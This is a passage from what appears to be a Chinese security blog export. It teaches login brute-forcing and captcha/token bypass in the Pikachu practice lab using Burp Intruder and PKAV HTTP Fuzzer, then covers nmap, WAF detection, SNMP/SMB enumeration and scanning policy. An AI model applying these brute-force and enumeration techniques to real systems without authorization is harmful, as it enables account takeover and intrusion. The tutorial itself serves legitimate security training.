</ul>
</li>
<li>对字典进行优化<ul>
<li>根据实际情况对字典进行优化，提高暴力破解的效率</li>
</ul>
</li>
<li>工具自动化操作</li>
</ul>
<p>以下实验环境是基于Pikachu靶场进行的。</p>
<p>靶场下载：<a href="https://github.com/zhuifengshaonianhanlu/pikachu">https://github.com/zhuifengshaonianhanlu/pikachu</a></p>
<h2 id="简单表单暴力破解"><a href="#简单表单暴力破解" class="headerlink" title="简单表单暴力破解"></a>简单表单暴力破解</h2><p><img src="https://i.loli.net/2021/10/05/WU9AscIgqDwNtE1.png" alt="img"></p>
<p>输入错误时，有以下提示</p>
<p><img src="https://i.loli.net/2021/10/05/eZYwM9kvyqftQBL.png" alt="img"></p>
<p>这里没有验证码等其他验证机制，抓包看看</p>
<p><img src="https://i.loli.net/2021/10/05/Q9KXaud3UbYzs1k.png" alt="411a58df5762da917562a60df616d9b7.png"></p>
<p>发送到Intruder进行暴力破解</p>
<p><img src="https://i.loli.net/2021/10/05/eEIQXjUospwLFuK.png" alt="e20f71994117892067fb23b951d60174.png"></p>
<p>设置好Payload</p>
<p><img src="https://i.loli.net/2021/10/05/fDNSacVGsy7Fvor.png" alt="b054b7e3eccc40104336ad93493844e7.png"></p>
<p><img src="https://i.loli.net/2021/10/05/BMmvOWEVGwtijJk.png" alt="c807ca1a8508c1ae817b5d803b1a4c5f.png"></p>
<p>然后把“ username or password is not exists～ ”复制到Grep Match中。后面可以利用Grep Match区分哪些请求里面有这个字符串</p>
<p><img src="https://i.loli.net/2021/10/05/xcmQdGXPbI8qaez.png" alt="d5c28d32cdd16bd6430c53da023752b1.png"></p>
<p>然后就可以开始攻击了，匹配到 username or password is not exists 都是攻击失败的，另外，从响应长度也可以看出攻击成功与否</p>
<p><img src="https://i.loli.net/2021/10/05/X75OasPWkIMLcwH.png" alt="a479b7c9cdea29fec0047c53e1e525fc.png"></p>
<h2 id="验证码绕过（on-server）"><a href="#验证码绕过（on-server）" class="headerlink" title="验证码绕过（on server）"></a>验证码绕过（on server）</h2><p>验证码可以用来防止恶意注册、防止暴力破解。服务端验证码常见问题：</p>
<ul>
<li>验证码在后台不过期，导致长期可以使用</li>
<li>验证码校验不严格，逻辑出现问题</li>
<li>验证码设计的太过简单和有规律，容易被猜解</li>
</ul>
<p><img src="https://i.loli.net/2021/10/05/JOpHyoWxMvltsui.png" alt="img"></p>
<p>我们先简单的测试一下，不输入验证码的情况下会提示验证码为空，输入错误验证码的情况下会提示验证码错误，只有验证码正确的前提下才会提示账号或密码不存在</p>
<p>下面通过抓包判断一下服务器端有没有对验证码进行验证，发现是有的</p>
<p><img src="https://i.loli.net/2021/10/05/RNCpgvOcTrULKI4.png" alt="img"></p>
<p>说明后端对验证码是有验证的，我们来了解一下验证码生成的逻辑：</p>
<p>当我们刷新页面的时候，我们会向后台发送一个请求，后台收到请求会生成一个验证码并在session中把验证码保存下来。</p>
<p>我们先生成一个新的验证码，然后在BurpSuite中输入正确的验证码</p>
<p><img src="https://i.loli.net/2021/10/05/grZoR2BVjCFqxkL.png" alt="img"></p>
<p>提示账号密码不存在</p>
<p><img src="https://i.loli.net/2021/10/05/Z29GPSH6xMmNXdD.png" alt="img"></p>
<p>我们换个密码再发送一次</p>
<p><img src="https://i.loli.net/2021/10/05/T3xV2H89Qts4GcM.png" alt="img"></p>
<p>发现依然是提示账号密码不存在，正常来说应该提示验证码错误，这说明验证码长期有效，我们发送到Intruder中直接暴力破解</p>
<p><img src="https://i.loli.net/2021/10/05/fNgdnPUuqSbcoLV.png" alt="f55213b55230b3fdb2c1b88f535e3df9.png"></p>
<h2 id="验证码绕过（on-client）"><a href="#验证码绕过（on-client）" class="headerlink" title="验证码绕过（on client）"></a>验证码绕过（on client）</h2><p><img src="https://img2018.cnblogs.com/blog/1782235/201909/1782235-20190918141249035-185107144.png" alt="img"></p>
<p>这里我们需要输入验证码，我们不能对验证码暴力破解，通过抓包发现请求里面只是多了验证码</p>
<p><img src="https://img2018.cnblogs.com/blog/1782235/201909/1782235-20190918141436927-844829976.png" alt="img"></p>
<p>通过查看源码，发现验证码的验证逻辑是在客户端实现的</p>
<p><img src="https://img2018.cnblogs.com/blog/1782235/201909/1782235-20190918141607397-1462570833.png" alt="img"></p>
<p>这个JavaScript会从0-9和26个大写字母中随机挑选5个作为验证码，然后用 validate() 去验证</p>
<p>另外，通过源码也可以看到，我们每点一次验证码，就会调用 createCode() 改变验证码</p>
<p><img src="https://img2018.cnblogs.com/blog/1782235/201909/1782235-20190918141835317-2117397253.png" alt="img"></p>
<p>通过BurpSuite发现后台不会对输入错误的验证码进行验证，在浏览器中，输入错误的验证码是有提示的</p>
<p><img src="https://img2018.cnblogs.com/blog/1782235/201909/1782235-20190918142146348-490097606.png" alt="img"></p>
<p>正常来说会有这个弹窗</p>
<p><img src="https://img2018.cnblogs.com/blog/1782235/201909/1782235-20190918142226004-1509701597.png" alt="img"></p>
<p>说明前端设置的验证码如同虚设，后端不会对验证码进行验证。那么我们不用理会验证码，直接进行暴力破解就可以了</p>
<p><img src="https://i.loli.net/2021/10/05/nahYLzDuR1ICHyl.png" alt="80e7b4b4b0da5a1ca4e4d0f538d282a1.png"></p>
<h2 id="PKAV-HTTP-Fuzzer-识别验证码"><a href="#PKAV-HTTP-Fuzzer-识别验证码" class="headerlink" title="PKAV HTTP Fuzzer 识别验证码"></a>PKAV HTTP Fuzzer 识别验证码</h2><p>PKAV HTTP Fuzzer是PKAV团队编写的一个带图形验证码爆破识别的渗透测试工具。</p>
<p>不过该工具现在已经停止更新了，最近一次更新是在2016年。</p>
<p>该工具只能识别较为简单的验证码。</p>
<p>使用之前需要先安装.net framework 4.0或以上版本</p>
<p>首先使用burpsuite对web表单进行抓包。</p>
<p><img src="https://i.loli.net/2021/10/05/xf2kUvyNce5KuDb.png" alt="120f248052e508b544bc09f227e038d9.png"></p>
<p><img src="https://i.loli.net/2021/10/05/SMAxKhDlHn4PIC3.png" alt="48529ff85d52307ce3d3533226811365.png"></p>
<p>打开PKAV HTTP Fuzzer，将地址与burp抓到的请求包粘贴到工具中的对应位置。</p>
<p><img src="https://i.loli.net/2021/10/05/nCiOrXZetAQ1Wvm.png" alt="f4b3f7eeb0e72590e3d5c5ab60861ede.png"></p>
<p>对用用户名和密码添加标记，对验证码添加验证码标记。</p>
<p><img src="https://i.loli.net/2021/10/05/qOHFEK8Z1nsvY3R.png" alt="0649d335bce73a54bccc64b755a2ab39.png"></p>
<p>更改重放模式为异值异步重放模式，对两个变体分别导入字典</p>
<p><img src="https://i.loli.net/2021/10/05/DUXnEG4cwrxJvao.png" alt="9d1936f68dd1d79324ae103447fb5444.png"></p>
<p>右键验证码图片，复制验证码地址</p>
<p><img src="https://i.loli.net/2021/10/05/q4fCtNX5wLJRIQO.png" alt="bb2635eed417fb5d9298cf0b9de92b62.png"></p>
<p>将验证码粘贴到到工具中的地址框</p>
<p><img src="https://i.loli.net/2021/10/05/lLVIYW8miKHJ6At.png" alt="8b1cfd6f013ded1cbd7fbda681ae2476.png"></p>
<p>对这种简单的验证码识别还算准确（注意使用自带识别引擎识别，第三方识别引擎都是用不了的）</p>
<p>使用发包器，开始进行暴力破解<img src="https://i.loli.net/2021/10/05/ixO7lGL5SVYPQCT.png" alt="51bfaff708834b9294d0c1d743b5bd98.png"></p>
<p>可以看到长度为867的返回包中显示登录成功。</p>
<p><img src="https://i.loli.net/2021/10/05/DBjJxQGIZgY2Szu.png" alt="6cef7fefde3290ab4d10b71814defec6.png"></p>
<h2 id="Token绕过"><a href="#Token绕过" class="headerlink" title="Token绕过"></a>Token绕过</h2><p>利用开发者工具可以发现这里有一个隐藏的标签</p>
<p><a href="https://img2018.cnblogs.com/blog/1782235/201909/1782235-20190918150005897-1483756020.png"><img src="https://i.loli.net/2021/10/05/651qkG8xwUJejQF.png" alt="img"></a></p>
<p>里面的数字就是我们的token，我的每次提交的请求都会有一个token值，后端会验证这个token值</p>
<p>但是这个token已经写到了html页面中，攻击者只需要写个工具，提交认证前都加上这个token就好了</p>
<p>我们抓包后，发送到intruder中，步骤如图</p>
<p><img src="https://i.loli.net/2021/10/05/LniaTh1z4BqKvJF.png" alt="468c044c99cb8b22304d3fca69cdc227.png"></p>
<p>这里只对admin用户进行暴力破解（注意攻击类型为Pitchfork）</p>
<p>我们把token设置变量，options的grep extract添加token：</p>
<p><img src="https://i.loli.net/2021/10/05/ZFqsTPl2HrgzuEh.png" alt="455810f95f3da0de85735a0b866ece0f.png"></p>
<p><img src="https://i.loli.net/2021/10/05/1mUksKjvVnIRFC6.png" alt="image-20211005185127542">**</p>
<p>token变量的type设置成recursive grep</p>
<p><img src="https://i.loli.net/2021/10/05/IZKfaYV6EdPWXmJ.png" alt="5ffd92bd1f4220bf840521e5d3802187.png"></p>
<p>将请求数设置为1</p>
<p><img src="https://i.loli.net/2021/10/05/y2fUX6Tav3Qeq4C.png" alt="2b707b1da69fbbab8082b1814b0d1c56.png"></p>
<p>最后点击Start attack进行攻击</p>
<p><img src="https://i.loli.net/2021/10/05/a9fJun1QRj87GPC.png" alt="32c699c665b8d80f3821d634c175a1bb.png"></p>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>扫描与枚举</category>
      </categories>
      <tags>
        <tag>暴力破解</tag>
      </tags>
  </entry>
  <entry>
    <title>防护扫描与服务枚举</title>
    <url>/post/fcfd17ed.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="防火墙识别"><a href="#防火墙识别" class="headerlink" title="防火墙识别"></a>防火墙识别</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>防火墙(Firewall):防火墙指的是一个由软件和硬件设备组合而成、在内部网和外部网之间、专用网与公共网之间的边界上构造的保护屏障。防火墙是一种保护计算机网络安全的技术性措施，它通过在网络边界上建立相应的网络通信监控系统来隔离内部和外部网络，以阻挡来自外部的网络入侵。</p>
<p>通过发送SYN和ACK数据包并分析回包可以大概判断端口是否被防火墙过滤，对应关系如下表：</p>
<p><img src="https://img.136.la/20210811/2623fe2699d84c3c95a67f0d743cb7b5.jpg" alt="技术分享图片"></p>
<h3 id="nmap检测"><a href="#nmap检测" class="headerlink" title="nmap检测"></a>nmap检测</h3><p>使用nmap识别是否开启防火墙过滤：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sA &lt;ip&gt; -p &lt;端口号&gt;	#端口号可随机</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/05/AyuLdYB7qV65Sbp.png" alt="5584d547d07031a8387f1626102702de.png"></p>
<p>从状态可以看出，前者开启了防护墙过滤，而后者没有。</p>
<h2 id="WAF识别"><a href="#WAF识别" class="headerlink" title="WAF识别"></a>WAF识别</h2><h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><p>Web应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。利用国际上公认的一种说法：Web应用防火墙是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一款产品。</p>
<h3 id="nmap脚本扫描"><a href="#nmap脚本扫描" class="headerlink" title="nmap脚本扫描"></a>nmap脚本扫描</h3><p>使用方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p 80 --script http-waf-detect.nse www.baidu.com</span><br></pre></td></tr></table></figure>

<h3 id="Wafw00f"><a href="#Wafw00f" class="headerlink" title="Wafw00f"></a>Wafw00f</h3><p>==Kali Linux内置工具==</p>
<p>使用方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wafw00f baidu.com</span><br></pre></td></tr></table></figure>

<h2 id="负载均衡检测"><a href="#负载均衡检测" class="headerlink" title="负载均衡检测"></a>负载均衡检测</h2><h3 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h3><p>负载均衡建立在现有网络结构之上，它提供了一种廉价有效透明的方法扩展网络设备和服务器的带宽、增加吞吐量、加强网络数据处理能力、提高网络的灵活性和可用性。</p>
<ul>
<li>广域网负载均衡</li>
</ul>
<p>他的原理就是DNS，简单的方法就是使用DNS轮询来进行负载均衡。当你访问一个域名时，同一个域名会被解析成多个A记录解析到多个ip地址上。</p>
<ul>
<li>服务器负载均衡</li>
</ul>
<p>基于web的服务，经常使用的是nginx、apache这种应用层的负载均衡。</p>
<p>当然也可以使用一些负载均衡设备去实现。</p>
<blockquote>
<p>目的：在扫描探测的阶段，我们也有必要发现一下目标域名被解析到多少个服务器，这些歌服务器有可能因为管理员的配置不善，不同的服务器之间他们的安全防护是不一样的，配置也不一样，有的ip可能就会存在问题。这时候我们去识别目标系统使用的是什么负载均衡，以及这个负载均衡，他是不是本身存在有漏洞。</p>
</blockquote>
<h3 id="ldb"><a href="#ldb" class="headerlink" title="ldb"></a>ldb</h3><p>使用方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ldb www.baidu.com</span><br></pre></td></tr></table></figure>

<h2 id="SNMP扫描"><a href="#SNMP扫描" class="headerlink" title="SNMP扫描"></a>SNMP扫描</h2><h3 id="简介-3"><a href="#简介-3" class="headerlink" title="简介"></a>简介</h3><p><strong>SNMP：简单网络管理协议</strong></p>
<ul>
<li>基于SNMP，进行网络设备监控，如：交换机、防火墙、服务器，CPU等其系统内部信息。基本都可以监控到</li>
<li>community：登录证书，容易被管理员遗忘修改其特征字符 #可用字典破解community（public/private/manager）</li>
<li>信息的金矿，经常被错误配置</li>
</ul>
<p><strong>MIB Tree：</strong></p>
<ul>
<li>SNMP Management Information</li>
<li>树型的网络设备管理功能数据库</li>
</ul>
<h3 id="实验前准备"><a href="#实验前准备" class="headerlink" title="实验前准备"></a>实验前准备</h3><p><strong>安装服务</strong></p>
<p><img src="https://i.loli.net/2021/10/05/85U3arIzFtbwdBm.png" alt="ae48d149296cc788257c26e64ca572ea.png"></p>
<p><strong>开启服务</strong></p>
<p><img src="https://i.loli.net/2021/10/05/WRrzJepmAH9lnhB.png" alt="d485a496a5508d5aa5948c360aa87d07.png"></p>
<p>默认接受的社区为monitor，且接受来自任何主机的snmp数据包</p>
<h3 id="snmp-check"><a href="#snmp-check" class="headerlink" title="snmp-check"></a>snmp-check</h3><p>==Kali Linux内置工具==</p>
<p>使用方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">snmp-check 192.168.123.188 -c monitor</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/05/uDUAGfRKconYF9V.png" alt="dbb7f10caccb74233aa89189bded2968.png"></p>
<p>相比于onesixtyone能扫描出更多信息，相比于snmpwalk可读性更好。</p>
<h2 id="SMB扫描"><a href="#SMB扫描" class="headerlink" title="SMB扫描"></a>SMB扫描</h2><h3 id="简介-4"><a href="#简介-4" class="headerlink" title="简介"></a>简介</h3><p><strong>SMB协议：</strong></p>
<ul>
<li>Server Message Block协议</li>
<li>微软历史上出现问题最多的协议</li>
<li>实现复杂，默认在Windows上是开放的，也是最常用的协议，用于实现文件的共享</li>
</ul>
<h3 id="nmap脚本扫描-1"><a href="#nmap脚本扫描-1" class="headerlink" title="nmap脚本扫描"></a>nmap脚本扫描</h3><p>可以使用nmap扫描默认开放的端口139,445，但是不能准确判断操作系统的类型，一般情况下是Windows系统</p>
<p>1、使用nmap自带的脚本进行操作系统的判断</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap 192.168.123.155 -p139,445 --script=smb-os-discovery.nse</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/05/AIN1zeR7KFWQykE.png" alt="0f24a04ebf8aef1ffa37c6ad8a661aa9.png"></p>
<p>2、扫描Windows系统中的SMB协议是否有漏洞；可以使用smb-vuln-*.nse来指定所有的脚本文件，进行全扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -v -p139,445 --script=smb-vuln-*.nse --script-args=safe=1 192.168.123.155 </span><br></pre></td></tr></table></figure>

<p>&lt;img src=”data:;base64,<br>        &lt;svg width=” 1700”=”” height=”1536” xmlns=”<a href="http://www.w3.org/2000/svg&quot;&gt;">http://www.w3.org/2000/svg&quot;&gt;</a>  “ /&gt;</p>
<h3 id="enum4linux"><a href="#enum4linux" class="headerlink" title="enum4linux"></a>enum4linux</h3><p>enum4linux是Kali Linux自带的一款信息收集工具。它可以收集Windows系统的大量信息，如用户名列表、主机列表、共享列表、密码策略信息、工作组和成员信息、主机信息、打印机信息等等。该工具主要是针对Windows NT/2000XP/2003，在Windows 7/10系统，部分功能受限。</p>
<p><strong>选项：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-U</span><br><span class="line">    获取用户列表</span><br><span class="line"></span><br><span class="line">-M</span><br><span class="line">    get machine list*</span><br><span class="line"></span><br><span class="line">-S</span><br><span class="line">    获取共享列表</span><br><span class="line"></span><br><span class="line">-P</span><br><span class="line">    获取密码策略信息</span><br><span class="line"></span><br><span class="line">-G</span><br><span class="line">    获取组和成员列表</span><br><span class="line"></span><br><span class="line">-d</span><br><span class="line">    详细说明，适用于-U和-S</span><br><span class="line"></span><br><span class="line">-u user</span><br><span class="line">    指定要使用的用户名（默认为“”）</span><br><span class="line"></span><br><span class="line">-p pass</span><br><span class="line">    指定要使用的密码（默认为“”）</span><br></pre></td></tr></table></figure>

<p><strong>附加选项：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-a</span><br><span class="line">    执行所有简单的枚举（-U -S -G -P -r -o -n -i）。如果您未提供其他任何选项，则启用此选项。</span><br><span class="line"></span><br><span class="line">-h</span><br><span class="line">    显示帮助信息并退出</span><br><span class="line"></span><br><span class="line">-r</span><br><span class="line">    通过RID循环枚举用户</span><br><span class="line"></span><br><span class="line">-R range</span><br><span class="line">    要枚举的范围（默认值：500-550、1000-1050，暗含-r）</span><br><span class="line"></span><br><span class="line">-K n</span><br><span class="line">    继续搜索RID，直到n个连续的RID与用户名不对应为止。 Impies RID范围以999999结尾。对于DC很有用。</span><br><span class="line"></span><br><span class="line">-l</span><br><span class="line">    通过LDAP 389 / TCP获取一些（有限的）信息（仅适用于DC）</span><br><span class="line"></span><br><span class="line">-s file</span><br><span class="line">    暴力破解推测股票名称</span><br><span class="line"></span><br><span class="line">-k user</span><br><span class="line">    远程系统上存在的用户（默认：管理员，来宾，krbtgt，域管理员，root，bin，none）。用于通过“ lookupsidknown_username”获取sid。使用逗号尝试多个用户：“ -k admin， user1，user2”</span><br><span class="line"></span><br><span class="line">-o</span><br><span class="line">    获取操作系统信息</span><br><span class="line"></span><br><span class="line">-i</span><br><span class="line">    获取打印机信息</span><br><span class="line"></span><br><span class="line">-w wrkg</span><br><span class="line">    手动指定工作组（通常自动找到）</span><br><span class="line"></span><br><span class="line">-n</span><br><span class="line">    做一个nmblookup（类似于nbtstat）</span><br><span class="line"></span><br><span class="line">-v</span><br><span class="line">    详细。 显示正在运行的完整命令（net，rpcclient等）</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Web安全</category>
        <category>扫描与枚举</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>漏洞扫描概述</title>
    <url>/post/2545d0b1.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="漏洞扫描的介绍"><a href="#漏洞扫描的介绍" class="headerlink" title="漏洞扫描的介绍"></a>漏洞扫描的介绍</h2><p>漏洞扫描是指基于漏洞数据库，通过扫描等手段对指定的远程或者本地计算机系统的安全脆弱性进行检测，发现可利用漏洞的一种安全检测（渗透攻击）行为。</p>
<p>漏洞扫描器是一类旨在识别操作系统和应用程序中弱点的自动化工具。</p>
<p>漏洞扫描器能够把各种安全漏洞集成在一起，自动利用这些安全漏洞对远程主机尝试攻击，从而确定目标主机是否存在这些安全漏洞。</p>
<h2 id="漏洞扫描器的使用对象"><a href="#漏洞扫描器的使用对象" class="headerlink" title="漏洞扫描器的使用对象"></a>漏洞扫描器的使用对象</h2><ul>
<li>黑客 / 渗透测试人员：自动化挖掘漏洞，利用有缺陷的代码、开放端口或是容易获取用户访问权限的程序进行渗透攻击。</li>
<li>安全运维人员：定期进行漏洞扫描并修复相应漏洞，以抵御黑客攻击，进而减少商业机密泄露与经济损失。</li>
</ul>
<h2 id="认识漏洞扫描器的局限性"><a href="#认识漏洞扫描器的局限性" class="headerlink" title="认识漏洞扫描器的局限性"></a>认识漏洞扫描器的局限性</h2><ul>
<li>只能检测出已知漏洞，无法检测出未知的漏洞（0day）</li>
<li>容易出现误报、漏检</li>
<li>在SRC漏洞挖掘中，存储型XSS不宜使用扫描器进行检测</li>
</ul>
<h2 id="漏洞评估流程"><a href="#漏洞评估流程" class="headerlink" title="漏洞评估流程"></a>漏洞评估流程</h2><h3 id="对现有设备进行定期评估"><a href="#对现有设备进行定期评估" class="headerlink" title="对现有设备进行定期评估"></a>对现有设备进行定期评估</h3><p>理想状态下，应要求每个部门都按照规范的时间表对其联网设备进行评估。</p>
<p>例如，可要求每月对下列网络和计算设备进行扫描：</p>
<ul>
<li>任何已知包含敏感数据的计算设备</li>
<li>任何必须满足特定监管要求的计算设备</li>
<li>任何作为用以构建和部署新的工作站/服务器的基本映像的文件系统映像或虚拟机模板</li>
<li>任何作用服务器或于数据存储的设备</li>
<li>任何网络基础设施设备</li>
</ul>
<p>除非另有授权，否则必须使用经批准的漏洞扫描工具进行扫描。要记住：漏洞扫描可能且必然会减慢其正在评估的网络、设备或应用程序。如果在工作时段内进行扫描，应注意尽量减少由于扫描造成的可能干扰。扫描应该在非高峰时段进行，并通过附加的二次扫描，将不合作或因关机而需要重新扫描的客户端纳入扫描。</p>
<h3 id="评估新的系统"><a href="#评估新的系统" class="headerlink" title="评估新的系统"></a>评估新的系统</h3><p>在完成漏洞评估且漏洞得到处理之前，任何新的系统都不应加入运营当中。</p>
<p>应当要求各部门在以下时机实施漏洞评估：</p>
<ul>
<li>在操作系统安装以及修补阶段完成时</li>
<li>在完成任何由供应商提供或内部开发的应用程序的安装时</li>
<li>在将信息系统投入运营之前</li>
<li>在完成用于部署于多个设备的映像或模板的设计时</li>
<li>在供应商提供信息系统交付时且用户进行验收之前，并在投入运营之前再次进行</li>
<li>对于新网络基础设备，在拷机测试阶段以及运营之前</li>
</ul>
<p>在上述每次脆弱性评估完成时，必须记录并修补所有发现的漏洞。</p>
<h3 id="理解扫描目标"><a href="#理解扫描目标" class="headerlink" title="理解扫描目标"></a>理解扫描目标</h3><p>各部门不应对不受其直接控制的系统进行侵入式扫描：</p>
<ul>
<li>各部门要求负责确保那些供应商所有的设备在可能危害企业的漏洞方面受到限制</li>
<li>供应商必须得到通知，且允许其在进行扫描时派出工作人员在场</li>
<li>未经部门和管理层的明确许可，不得允许供应商对信息系统进行扫描</li>
</ul>
<p>对那些疑似在网络上引发破坏行为的联网计算设备，应通过非侵入方式进行扫描，以追查破坏行为的源头。</p>
<h3 id="缓解风险"><a href="#缓解风险" class="headerlink" title="缓解风险"></a>缓解风险</h3><p>在每次评估结束时，各部门应编制以下内容文档：</p>
<ul>
<li>所有发现的漏洞、漏洞的严重性，以及受其影响的信息系统</li>
<li>对于每个已经发现的漏洞详细说明如何修补或消除该漏洞</li>
<li>企业漏洞扫描工具生成的报告，并应评估该报告对于编制该文档的适合性</li>
</ul>
<p>作为年度安全扫描流程的一部分，应该要求各部门将根据该文档开展的漏洞扫描与修复工作进行记录归档。</p>
<p>针对发现的漏洞，应基于一定的原则采取修复或缓解措施，例如：</p>
<ul>
<li>严重漏洞应在被发现后15天内被完全解决。</li>
<li>高危漏洞应在被发现后30天内被完全解决。</li>
<li>中危漏洞应在被发现后60天内被完全解决。</li>
<li>低危漏洞应在被发现后90天内被完全解决。</li>
</ul>
<p>当漏洞被利用的风险得到完全清除，且对设备的后续扫描显示漏洞不复存在，则可以认为漏洞已经得到修复。通常，该目标可通过对操作系统或应用系统打补丁或升级软件实现。</p>
<h2 id="可执行的扫描类型"><a href="#可执行的扫描类型" class="headerlink" title="可执行的扫描类型"></a>可执行的扫描类型</h2><ul>
<li>认证扫描：此类扫描通过对特定资质凭据进行验证来判断机器是否存在漏洞，而无需进行侵入式扫描。</li>
<li>信息系统：扫描协同运行以执行一组业务功能的软件、硬件和接口组件。</li>
<li>内部机密：扫描中具有维持特定信息仅对那些得到授权和需要了解该信息的人开放的需求。</li>
<li>侵入式扫描：通过主动执行已知的漏洞利用手段来确定漏洞存在的一种扫描方式。</li>
<li>联网计算机设备：扫描任何连接到网络用于提供访问、处理和存储信息的手段的计算设备。</li>
<li>网络基础设施设备：该类扫描针对提供信息传输功能的设备，如路由器、交换机、防护墙和桥接设备；不包括网络服务器和工作站，除非这些服务器/工作站为特定的提供网络传输的功能服务。</li>
<li>部门：扫描组织中定义的一个负责保护某个给定的信息资产的单位。</li>
</ul>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>扫描与枚举</category>
      </categories>
      <tags>
        <tag>漏洞扫描</tag>
      </tags>
  </entry>
  <entry>
    <title>端口扫描</title>
    <url>/post/cbdcd826.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="网络端口"><a href="#网络端口" class="headerlink" title="网络端口"></a>网络端口</h2><h3 id="何为端口"><a href="#何为端口" class="headerlink" title="何为端口"></a>何为端口</h3><p>在网络技术中，端口(Port)大致有两种意思：一是物理意义上的端口，比如，ADSL Modem、集线器、交换机、路由器用于连接其他网络设备的接口，如RJ-45端口、SC端口等等；二是逻辑意义上的端口，一般是指TCP/IP协议中的端口，端口号的范围从0到65535，比如用于浏览网页服务的80端口，用于FTP服务的21端口等等。</p>
<h3 id="端口分类"><a href="#端口分类" class="headerlink" title="端口分类"></a>端口分类</h3><p>按端口号可分为3大类：</p>
<ul>
<li>公认端口（Well Known Ports）：从0到1023，它们紧密绑定（binding）于一些服务。通常这些端口的通讯明确表明了某种服务的协议。例如：80端口实际上总是HTTP通讯。</li>
<li>注册端口（Registered Ports）：从1024到49151。它们松散地绑定于一些服务。也就是说有许多服务绑定于这些端口，这些端口同样用于许多其它目的。例如：许多系统处理动态端口从1024左右开始。</li>
<li>动态和/或私有端口（Dynamic and/or Private Ports）：从49152到65535。理论上，不应为服务分配这些端口。实际上，机器通常从1024起分配动态端口。但也有例外：SUN的RPC端口从32768开始。</li>
</ul>
<h3 id="常用端口"><a href="#常用端口" class="headerlink" title="常用端口"></a>常用端口</h3><p>21端口：FTP 文件传输服务</p>
<p>22端口：SSH 远程连接服务</p>
<p>23端口：TELNET 终端仿真服务</p>
<p>3389端口：Windows远程登录服务</p>
<p>5938端口：TeamViewer 远程服务管理工具</p>
<p>139端口：NetBIOS 文件与打印共享</p>
<p>445端口：SMB 文件共享</p>
<p>25端口：SMTP 简单邮件传输协议</p>
<p>53端口：DNS 域名解析协议</p>
<p>161端口：SNMP 简单网络管理协议</p>
<p>80端口：HTTP 超文本传输协议</p>
<p>443端口：HTTPS SSL加密的超文本传输协议</p>
<p>3306端口：MYSQL数据库端口</p>
<p>5432端口：PostgreSQL数据库端口</p>
<p>1433端口：SQLServer数据库端口</p>
<p>1521端口：Oracle数据库默认端口</p>
<p>6379端口：Redis数据库端口</p>
<p>27017端口：mongoDB数据库默认端口</p>
<p>8080端口：WWW代理服务端口（Tomcat、JBoss等）</p>
<p>9200端口：Elasticsearch服务器端口</p>
<blockquote>
<p>端口大全：<a href="https://www.douban.com/note/568630865/">https://www.douban.com/note/568630865/</a></p>
</blockquote>
<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><h3 id="Nmap的介绍"><a href="#Nmap的介绍" class="headerlink" title="Nmap的介绍"></a>Nmap的介绍</h3><p>Nmap (“Network Mapper(网络映射器)”) 是一款开放源代码的网络探测和安全审核的工具。它的设计目标是快速地扫描大型网络，当然用它扫描单个主机也没有问题。Nmap以新颖的方式使用原始IP报文来发现网络上有哪些主机，那些主机提供什么服务(应用程序名和版本)，那些服务运行在什么操作系统(包括版本信息)， 它们使用什么类型的报文过滤器/防火墙，以及一堆其它功能。虽然Nmap通常用于安全审核，许多系统管理员和网络管理员也用它来做一些日常的工作，比如查看整个网络的信息， 管理服务升级计划，以及监视主机和服务的运行。</p>
<blockquote>
<p>nmap中文手册：<a href="http://www.nmap.com.cn/doc/manual.shtm">http://www.nmap.com.cn/doc/manual.shtm</a></p>
</blockquote>
<h3 id="Nmap的作用"><a href="#Nmap的作用" class="headerlink" title="Nmap的作用"></a>Nmap的作用</h3><ul>
<li>检测活动在网络上的主机（主机发现）</li>
<li>检测主机上的开放端口（端口发现或枚举）</li>
<li>检测到相应的端口（服务发现）的软件或版本</li>
<li>检测操作系统，硬件地址，以及软件版本</li>
<li>检测脆弱性的漏洞（Nmap的脚本）</li>
</ul>
<h3 id="Nmap扫描类型"><a href="#Nmap扫描类型" class="headerlink" title="Nmap扫描类型"></a>Nmap扫描类型</h3><p><img src="https://i.loli.net/2021/10/05/A8CljTvOgLra7bD.png" alt="4ea886c07221756bb40621a525063c45.png"></p>
